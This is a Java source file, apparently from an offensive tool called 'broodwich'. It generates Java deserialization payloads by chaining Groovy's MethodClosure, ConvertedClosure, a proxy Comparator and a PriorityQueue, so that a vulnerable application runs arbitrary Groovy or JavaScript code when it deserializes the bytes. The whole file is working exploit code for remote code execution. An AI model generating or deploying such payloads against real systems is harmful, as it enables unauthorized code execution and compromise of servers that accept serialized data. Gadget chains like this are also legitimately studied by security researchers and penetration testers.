package party.itistimeto.broodwich.deserialization;

import groovy.util.Eval;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

public class GroovyPayload implements ScriptEngineEvaluator, GroovyExpressionEvaluator {
    @Override
    public byte[] generateScriptPayload(String scriptText, String scriptType) {
        return this.generateGroovyPayload(String.format("new javax.script.ScriptEngineManager().getEngineByExtension('%s').eval('%s')", scriptType, scriptText));
    }

    @Override
    public byte[] generateJavaScriptPayload(String scriptText) {
        return this.generateScriptPayload(scriptText, "js");
    }

    @Override
    public byte[] generateGroovyPayload(String scriptText) {
        MethodClosure closure = new MethodClosure(Eval.class, "x");
        ConvertedClosure ih = new ConvertedClosure(closure, "compare");
        Comparator proxy = (Comparator) Proxy.newProxyInstance(GroovyPayload.class.getClassLoader(), new Class[]{Comparator.class}, ih);
        PriorityQueue<String> pq = new PriorityQueue<>(Comparator.naturalOrder());
        pq.add(scriptText);
        pq.add("Eval.me(x); 0");
        Util.setField(pq, "comparator", proxy);

        return Util.serialize(pq);
    }
}
